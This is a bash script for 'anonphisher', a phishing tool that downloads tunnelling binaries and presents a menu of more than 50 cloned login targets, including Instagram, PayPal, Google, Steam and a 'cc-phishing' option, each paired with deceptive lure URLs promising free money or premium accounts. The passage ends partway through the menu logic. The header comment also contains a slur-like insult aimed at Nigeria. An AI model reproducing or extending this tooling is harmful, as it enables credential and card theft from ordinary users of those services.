#!/bin/bash
#Author: sinistervibranium
#Credits to: Akshay  &  TAHMID RAYAT 
#Version: 3.3.2 updated
#Do not copy script without authors' consent it is illegal and makes you as stupid as Nigeria or as stupid as the p in psychology
#Facebook: https://facebook.com/AnonyminHack5
clear='\033[0m'       # Text Reset
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # black
Yellow='\033[0;33m'       # red
Blue='\033[0;34m'         # black 
Purple='\033[0;35m'       # red
Cyan='\033[0;36m'         # black 
White='\033[0;37m'        # red
Orange='\033[33m'         # Orange
LGREY='\033[0;30m'		  # light black 
# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White
BLGREY='\033[1;30m'		  # Grey
# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White
__version__="3.3.2"
## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='5555'
## ANSI colors (FG & BG)
RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" ORANGE="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
##Script Termination
exit_on_signal_SIGINT() {
    { echo -ne "\n\n""${RED}[${White}!${RED}]${Red} Program Interrupted. " 2>&1; reset_color; }
    exit 0
}
exit_on_signal_SIGTERM() {
    { echo -ne "\n\n""${RED}[${White}!${RED}]${Red} Program Interrupted. " 2>&1; reset_color; }
    exit 0
}
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM
reset_color() {
    tput sgr0 
    tput op
    return
}
check_update() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
	latest_version=$(curl -s "https://api.github.com/repos/TermuxHackz/anonphisher/releases/latest" | grep -Po '"tag_name": "\K.*?(?=")')
	if [[ $latest_version != "" ]]; then
		if [[ $latest_version != $__version__ ]]; then
			echo -e "${GREEN}New version available : ${ORANGE}$latest_version${WHITE}"
			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Updating to latest version..."
			git pull
			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Update successful."
			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Restarting tool..."
			bash setup
			exit 0
		else
			echo -e "${GREEN}No update available."
			sleep 1
		fi
	else
		echo -e "${RED}Failed to check for update."
	fi

}
check_internet() {
    echo -ne "\n${Green}[${White}+${Green}]${Cyan} Internet Status: "
    timeout 3s curl -fIs "https://github.com/TermuxHackz" > /dev/null
    [ $? -eq 0 ] && echo -e "${Green}Online${White}" && check_update || echo -e "${Red}Offline${White}"
}
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}
## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi
if [[ -d .termuxhackz ]]; then
printf ""
else
mkdir .termuxhackz
fi
if [[ -d logs ]]; then
printf ""
else
mkdir logs
mkdir .cld.log
mv .cld.log .server
fi
if [[ -e sites.zip ]]; then
unzip -qq sites.zip
rm sites.zip
fi
if [[ -d ~/.ssh ]]; then
printf ""
else
mkdir ~/.ssh
fi
## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi
if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi
## Kill already running process
kill_pid() {
	pkill -f "php|cloudflared|loclx|localtunnel"
}
## Download binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}
##Setup Custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}!${RED}]${ORANGE} Do you want a Custom port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port number: $CU_P, Try Again...${WHITE}"
			{ sleep 2; clear; smallbanner; cusport; }
		fi
	else
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT....${WHITE}\n"
	fi

}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}
## INstall LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then #Change to .server/loclx
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

menu() {
printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m  Origin\e[0m         \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;94m Update\e[0m\n" 
printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;94m Author\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m vk\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m adobe\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m badoo\e[0m\n"
printf "\e[1;34m==================================================\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m cryptocoin\e[0m \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m deviantart\e[0m \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m dropbox\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m ebay\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m paypal\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m pinterest\e[0m\n"  
printf "\e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m playstation\e[0m\e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m reddit\e[0m     \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;93m xbox\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;93m yandex\e[0m     \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;93m twitch\e[0m     \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;93m stackoverflow\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;93m messenger\e[0m  \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;93m shopify\e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;93m shopping\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;93m verizon\e[0m    \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;93m quora\e[0m      \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;93m bet9ja\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;93m Wi-Fi\e[0m      \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;93m Bitcoin\e[0m    \e[1;92m[\e[0m\e[1;77m45\e[0m\e[1;92m]\e[0m\e[1;93m free fire\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;93m Pubg\e[0m       \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;93m Fortnite\e[0m   \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;93m cc-phishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;93m C.O.D\e[0m      \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;93m Mediafire\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;93m Airbnb\e[0m     \e[1;92m[\e[0m\e[1;77m52\e[0m\e[1;92m]\e[0m\e[1;93m Discord\e[0m    \e[1;92m[\e[0m\e[1;77m53\e[0m\e[1;92m]\e[0m\e[1;93m Roblox\e[0m\n"
read -p $'\n\e[1;92manonphisher>> \e[0m\en' option


if [[ $option == 1 ]]; then
instagram
elif [[ $option == 2 ]]; then
facebook
elif [[ $option == 3 ]]; then
website="snapchat"
mask='https://view-locked-snapchat-accounts-secretly'
tunnel_menu
elif [[ $option == 4 ]]; then
website="twitter"
mask='https://get-blue-badge-on-twitter-free'
tunnel_menu
elif [[ $option == 5 ]]; then
website="github"
tunnel_menu
elif [[ $option == 6 ]]; then
gmail
elif [[ $option == 7 ]]; then
website="spotify"
mask='https://convert-your-account-to-spotify-premium'
tunnel_menu

elif [[ $option == 8 ]]; then
website="netflix"
mask='https://upgrade-your-netflix-plan-free'
tunnel_menu

elif [[ $option == 9 ]]; then
website="origin"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 10 ]]; then
website="steam"
mask='https://steam-free-gift-card'
tunnel_menu

elif [[ $option == 11 ]]; then
website="yahoo"
mask='https://grab-mail-from-anyother-yahoo-account-free'
tunnel_menu

elif [[ $option == 12 ]]; then
website="linkedin"
mask='https://get-a-premium-plan-for-linkedin-free'
tunnel_menu

elif [[ $option == 13 ]]; then
website="protonmail"
mask='https://protonmail-pro-basics-for-free'
tunnel_menu

elif [[ $option == 14 ]]; then
website="wordpress"
mask='https://wordpress-traffic-free'
tunnel_menu

elif [[ $option == 15 ]]; then
website="microsoft"
mask='https://unlimited-onedrive-space-for-free'
tunnel_menu

elif [[ $option == 16 ]]; then
website="instafollowers"
tunnel_menu

elif [[ $option == 17 ]]; then
website="gitlab"
mask='https://get-1k-followers-on-gitlab-free'
tunnel_menu

elif [[ $option == 18 ]]; then
website="create"
createpage
tunnel_menu

elif [[ $option == 19 ]]; then
echo -e "\e[101m Bye!!.. and have a good day 👋 \e[0m"
sleep 0.5
exit 1 

elif [[ $option == 20 ]]; then
sleep 1
echo "Updating Anonphisher... " | lolcat
sleep 0.5
clear
echo -e "\e[1;92m...//..\e[0m\e[1;93m~Searching for updates ~...\e[0m..//..\e[0m"
sleep 2
clear
echo -e "\e[1;94m [+] Updates Found [+] \e[0m"
sleep 2
clear
smallmenu() {
sleep 0.5
printf "\e[1;97mProceed to update?\e[0m"
sleep 0.5
printf "\n"
sleep 0.5
printf "\e[1;97m[01]\e[0m\e[1;92m Yes\e[0m\n"
sleep 0.5
printf "\e[1;97m[02]\e[0m\e[1;92m No\e[0m\n"
sleep 0.5
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose: \e[0m\en' choice

if [[ $choice == 1 || $choice == 01 ]]; then
echo -e "\e[1;93m Nice choice... Haha😋\e[0m"
sleep 0.5
echo -e "\e[1;92m Press enter to update or \e[0m\e[1;37mCTRL C\e[0m\e[1;92m to exit.. \e[0m"
read a1
echo "Updating now..!!" | lolcat
sleep 1
cd $HOME || cd /data/data/com.termux/files/home
rm -rf anonphisher
git clone https://github.com/TermuxHackz/anonphisher
cd anonphisher
chmod 777 *
printf "\e[1;92m[\e[0m\e[1;77m✔\e[0m\e[1;92m]\e[0m\e[1;93m Update Completed!!\e[0m\n" 
echo ""
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;93m RUN bash anonphisher.sh\e[0m\n" 


elif [[ $choice == 2 || $choice == 02 ]]; then
echo -e "\e[1;94m As you wish...lol\e[0m"
sleep 0.5
echo -e "\e[1;93m Leave!!🙄\e[0m"
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;93m ANONPHISHER NOT UPDATED.!!!!!!..UPDATE!!\e[0m\n" 
exit 1

else
printf "\e[1;93m [!] Wrong option [!]\e[0m\n"
clear
menu
fi
}
smallmenu

elif [[ $option == 21 ]]; then
clear
printf "\n"
sleep 0.5
printf "\e[1;92m============\e[0m\e[1;91m[\e[0m\e[1;93mAuthor\e[0m\e[1;91m]\e[0m\e[1;92m============\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Version: \e[0m\e[1;37m3.3.2		  \e[0m\e[1;97m  [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Twitter: \e[0m\e[1;34mAnonyminHack5 \e[0m\e[1;97m   [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Facebook: \e[0m\e[1;36mAnonyminHack5 \e[0m\e[1;97m  [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Created by \e[0m\e[1;37mAnonyminHack5 \e[0m\e[1;97m [•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Team: \e[0m\e[1;34mTermuxHackz Society \e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Credits: \e[0m\e[1;34mAkshay,TAHMID RAYAT &John Smith \e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Github: \e[0m\e[1;36mTermuxHackz \e[0m\e[1;97m      [•] \e[0m\n"
sleep 0.5
printf "\e[1;92m==========\e[0m\e[1;91m[\e[0m\e[1;93mAnonphisher\e[0m\e[1;91m]\e[0m\e[1;92m==========\e[0m\n"
sleep 0.5
printf "\n"
sleep 0.5
echo -e "\e[1;98m Press enter to go back \e[0m\e[1;37m or CTRL + C \e[0m\e[1;92mto exit\e[0m"
read a1
clear
banner
menu

elif [[ $option == 22 ]]; then
vk

elif [[ $option == 23 ]]; then
website="adobe"
mask='https://get-adobe-lifetime-pro-membership-free'
tunnel_menu

elif [[ $option == 24 ]]; then
website="badoo"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 25 ]]; then
website="cryptocoinsniper"
tunnel_menu 

elif [[ $option == 26 ]]; then
website="deviantart"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu 

elif [[ $option == 27 ]]; then
website="dropbox"
mask='https://get-1TB-cloud-storage-free'
tunnel_menu

elif [[ $option == 28 ]]; then
website="ebay"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 29 ]]; then
website="paypal"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 30 ]]; then
website="pinterest"
mask='https://get-a-premium-plan-for-pinterest-free'
tunnel_menu

elif [[ $option == 31 ]]; then
website="playstation"
mask='https://playstation-free-gift-card'
tunnel_menu

elif [[ $option == 32 ]]; then
website="reddit"
mask='https://reddit-official-verified-member-badge'
tunnel_menu

elif [[ $option == 33 ]]; then
website="xbox"
mask='https://get-500-usd-free-to-your-acount'
tunnel_menu

elif [[ $option == 34 ]]; then
website="yandex"
mask='https://grab-mail-from-anyother-yandex-account-free'
tunnel_menu

elif [[ $option == 35 ]]; then
website="twitch"
mask='https://unlimited-twitch-tv-user-for-free'
tunnel_menu

elif [[ $option == 36 ]]; then
website="stackoverflow"
mask='https://get-stackoverflow-lifetime-pro-membership-free'
tunnel_menu

elif [[ $option == 37 ]]; then
website="messenger"
tunnel_menu

elif [[ $option == 38 ]]; then
website="shopify"
tunnel_menu

elif [[ $option == 39 ]]; then
website="shopping"
tunnel_menu

elif [[ $option == 40 ]]; then
website="verizon"
tunnel_menu

elif [[ $option == 41 ]]; then
website="quora"
mask='https://quora-premium-for-free'
tunnel_menu

elif [[ $option == 42 ]]; then
website="bet9ja"
tunnel_menu

elif [[ $option == 43 ]]; then
website="Wi-Fi"
tunnel_menu

elif [[ $option == 44 ]]; then
website="Bitcoin"
tunnel_menu

elif [[ $option == 45 ]]; then
website="free_fire"
tunnel_menu

elif [[ $option == 46 ]]; then
website="pugb"
tunnel_menu

elif [[ $option == 47 ]]; then
website="fortnite"
tunnel_menu

elif [[ $option == 48 ]]; then
website="cc-phishing"
tunnel_menu

elif [[ $option == 49 ]]; then
website="cod"
tunnel_menu

elif [[ $option == 50 ]]; then
website="mediafire"
mask='https://get-1TB-on-mediafire-free'
tunnel_menu

elif [[ $option == 51 ]]; then
website="airbnb"
mask='https://airbnb-com'
tunnel_menu

elif [[ $option == 52 ]]; then
website="discord"
tunnel_menu

elif [[ $option == 53 ]]; then
website="roblox"
tunnel_menu

else
printf "\e[1;93m[\e[0m\e[1;31m!\e[0m\e[1;93m]\e[0m\e[1;37m Invalid option\e[0m\e[1;93m [\e[0m\e[1;31m!\e[0m\e[1;93m]\e[0m\n"
sleep 0.95
